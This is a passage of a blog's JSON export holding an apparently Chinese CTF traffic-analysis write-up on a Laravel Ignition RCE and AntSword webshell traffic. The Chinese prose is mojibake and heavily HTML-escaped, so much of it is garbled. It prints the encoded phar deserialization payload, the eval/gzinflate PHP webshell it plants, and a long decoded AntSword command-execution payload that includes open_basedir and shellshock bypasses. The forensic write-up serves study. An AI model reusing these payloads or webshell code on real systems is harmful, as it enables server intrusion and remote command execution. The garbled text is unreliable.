PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start Automator doesnâ€™t know the path of npm, so it should be exported frist.","categories":[],"tags":[],"author":"Polo"},{"title":"ç»¿åŸæ¯æµé‡åˆ†æ","slug":"ç»¿åŸæ¯æµé‡åˆ†æ","date":"2021-10-07T02:33:09.000Z","updated":"2021-10-07T13:25:07.241Z","comments":true,"path":"2021/10/07/ç»¿åŸæ¯æµé‡åˆ†æ/","link":"","permalink":"https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"è¿™é¢˜æŒºæœ‰æ„æ€çš„ï¼Œè¿˜æ˜¯æŒ‰æµé‡åˆ†æçš„æ€è·¯æ¥åšï¼Œä¸ªäººä¹ æƒ¯å…ˆçœ‹poståŒ…åœ¨è¿™é‡Œçœ‹åˆ°äº†å¾ˆå¤šignitionä¹‹ç±»çš„åŒ…ï¼Œç™¾åº¦äº†ä¸‹è¿™æ˜¯ä¸€ä¸ªlaravelçš„RCEã€‚åé¢çš„åŒ…ä¸€ç›´åœ¨å‘.config.php postæ•°æ®ï¼Œæ€€ç–‘config.phpæ˜¯å†™çš„é©¬ï¼Œè·Ÿè¿›å»çœ‹çœ‹ã€‚ä½¿ç”¨http contains configè¿‡æ»¤å‡ºæ¥ã€‚å¾ˆæ˜æ˜¾æ˜¯webshelläº†ï¼Œè¿™æ˜¯åœ¨æ‰§è¡Œlsç»§ç»­è·Ÿè¸ªè¿™ä¸ªwebshellçš„æ•°æ®åŒ…ï¼Œçœ‹çœ‹æœ‰æ— æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚çœ‹åˆ°äº†ä¸€ä¸ªsecret.zipï¼Œä½†æ˜¯httpå¯¹è±¡å¯¼å‡ºå¹¶æ²¡æœ‰è¿™ç©æ„ã€‚ç»§ç»­è¿½è¸ªçœ‹åˆ°äº†pkå¼€å¤´çš„ä¸€æ®µæ•°æ®ï¼Œè€ƒè™‘æ˜¯å‹ç¼©åŒ…ï¼Œå°è¯•è¿›è¡Œè¿˜åŸã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‹ç¼©åŒ…å‰åæœ‰ä¸¤æ®µå­—ç¬¦ä¸²æ˜¯èšå‰‘è‡ªå¸¦å¹²æ‰°æµé‡ç‰¹å¾çš„ã€‚è¿˜åŸä¹‹åæ˜¯ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œä¸æ˜¯ä¼ªåŠ å¯†ï¼Œä¸‹ä¸€æ­¥çš„ç›®çš„æ˜¯æ‰¾åˆ°å‹ç¼©åŒ…çš„å¯†ç ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ–‡ä»¶åå’Œcobalt strikeæœ‰å…³ï¼ˆrtåºŸç‰©ç‹‚å–œï¼‰ï¼Œç„¶åæœäº†ä¸‹.cobaltstrike.beacon_keysè¿™ä¸ªä¸œè¥¿æ˜¯å¹²å˜›çš„ã€‚ä¸Šè¿°æ–‡ä»¶æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å…¬é’¥ç§é’¥æ–‡ä»¶ï¼ŒCSçš„beaconä¼šåµŒå…¥è¿™ä¸ªæ–‡ä»¶ä¸­çš„å…¬é’¥ï¼Œå½“ç„¶äº†ï¼Œç§é’¥æ˜¯ç•™ç»™serverè‡ªå·±çš„ã€‚ä¸‹ä¸€æ­¥åº”è¯¥æ˜¯å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè§£å¯†ï¼Œè·å–CSçš„é€šä¿¡æ•°æ®ã€‚æ—¢ç„¶çŸ¥é“äº†æ˜¯cobalt strikeçš„é€šä¿¡æµé‡ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾åˆ°beaconä¸teamserveräº¤äº’çš„æ•°æ®åŒ…ï¼Œä½†è¿™ä¸ªå‰ææ˜¯å¾—åˆ°ç§é’¥ã€‚è·å–ç§é’¥çš„å‰ææ˜¯è§£å¼€å‹ç¼©åŒ…çš„å¯†ç ã€‚ä¸‹é¢éœ€è¦åšçš„æ˜¯æ‰¾å‹ç¼©åŒ…çš„å¯†ç ã€‚ç»§ç»­è¿½è¸ªæ•°æ®åŒ…ï¼Œåœ¨ä¸Šé¢çš„åŒ…ä¸­çœ‹åˆ°äº†è§£å‹çš„æ“ä½œã€‚ä½†æ˜¯å½“æ—¶æˆ‘ç›´æ¥å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡ŒURL+BASE64è§£ç ï¼Œå¹¶ä¸èƒ½å¾—åˆ°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„æ˜¯çœ‹ä¸€çœ‹ä¼ çš„é©¬çš„å†…å®¹ä»¥åŠåŠ å¯†æ–¹å¼ã€‚åœ¨laravel RCEçš„åŒ…ä¸­å¯ä»¥æ‰¾åˆ°payload 1P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00 æŠŠpayloadä¸­çš„=00æ›¿æ¢ä¸ºç©ºç„¶åè§£base64å¯ä»¥å¾—åˆ° 12&lt;?php __HALT_COMPILER(); ?&gt; \u0002\u0002\u0011\u0001ï¿½\u0001a:2:&#123;i:7;O:32:&quot;Monolog\\Handler\\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\\Handler\\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;\u0005dummy\u0004\\KKa\u0004 ~Ø¶\u0001\btest.txt\u0004\\KKa\u0004 ~Ø¶\u0001testtest6z&#x3D;Jcï¿½Fï¿½ï¿½ØİŒ&amp;~ï¿½&lt;@ï¿½ï¿½\u0002GBMB è¿™å†™è¿›å»çš„åº”è¯¥æ˜¯ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼Œåº”è¯¥æ˜¯å’Œlaravelçš„rceæœ‰å…³ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¼ è¿›å»çš„å†…å®¹ã€‚@eval(@gzinflate(base64_decode($_POST[14433])));æ‰€ä»¥éœ€è¦åšgzipå’Œbase64çš„è§£ç æ‰å¯ä»¥æ˜ç™½æµé‡åŒ…ä¸­çš„å…·ä½“å†…å®¹ 1234514433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4Fb430b310838a93&#x3D;4gf861d394170244&#x3D;X4Y21kufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm ä¸Šé¢æ˜¯å¯¹è§£å‹åŒ…çš„urlè§£ç ï¼Œç„¶ågzip+base64è§£ç å°è¯•è¿˜åŸä»£ç å†…å®¹,å¯¹ä¸Šé¢çš„æ¯ä¸ªå‚æ•°è¿›è¡Œè§£å¯†!ä¸‹é¢è¿™ä¸ªåŒ…æ˜¯è§£å‹ç¼©çš„åŒ…çš„è§£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);if($opdir) &#123; $ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir); @array_push($oparr,$ocwd,sys_get_temp_dir()); foreach($oparr as $item) &#123; if(!@is_writable($item)) &#123; continue; &#125; ; $tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;; @mkdir($tmdir); if(!@file_exists($tmdir)) &#123; continue; &#125; @chdir($tmdir); @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\\\\\|\\&#x2F;&#x2F;&quot;,$tmdir); for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123; @chdir(&quot;..&quot;); &#125; ; @ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;); @rmdir($tmdir); break; &#125; ;&#125;;;function asenc($out) &#123; return $out;&#125;;function asoutput() &#123; $output&#x3D;ob_get_contents(); ob_end_clean(); echo &quot;36&quot;.&quot;4f2&quot;; echo @asenc($output); echo &quot;42&quot;.&quot;ff1&quot;;&#125;ob_start();try &#123; $p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2)); $s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); $envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2)); $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;&#x2F;c \\&quot;&#123;$s&#125;\\&quot;&quot;; if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;); &#125; else &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;); &#125; if(!empty($envstr)) &#123; $envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr); foreach($envarr as $v) &#123; if (!empty($v)) &#123; @putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v)); &#125; &#125; &#125; $r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;; function fe($f) &#123; $d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;)); if(empty($d)) &#123; $d&#x3D;array(); &#125; else &#123; $d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d)); &#125; return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d)); &#125; ; function runshellshock($d, $c) &#123; if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123; if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123; $tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;); putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;); if (fe(&#39;error_log&#39;)) &#123; error_log(&quot;a&quot;, 1); &#125; else &#123; mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;); &#125; &#125; else &#123; return False; &#125; $output &#x3D; @file_get_contents($tmp); @unlink($tmp); if ($output !&#x3D; &quot;&quot;) &#123; print($output); return True; &#125; &#125; return False; &#125; ; function runcmd($c) &#123; $ret&#x3D;0; $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if(fe(&#39;system&#39;)) &#123; @system($c,$ret); &#125; elseif(fe(&#39;passthru&#39;)) &#123; @passthru($c,$ret); &#125; elseif(fe(&#39;shell_exec&#39;)) &#123; print(@shell_exec($c)); &#125; elseif(fe(&#39;exec&#39;)) &#123; @exec($c,$o,$ret); print(join(&quot;&quot;,$o)); &#125; elseif(fe(&#39;popen&#39;)) &#123; $fp&#x3D;@popen($c,&#39;r&#39;); while(!@feof($fp)) &#123; print(@fgets($fp,2048)); &#125; @pclose($fp); &#125; elseif(fe(&#39;proc_open&#39;)) &#123; $p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io); while(!@feof($io[1])) &#123; print(@fgets($io[1],2048)); &#125; 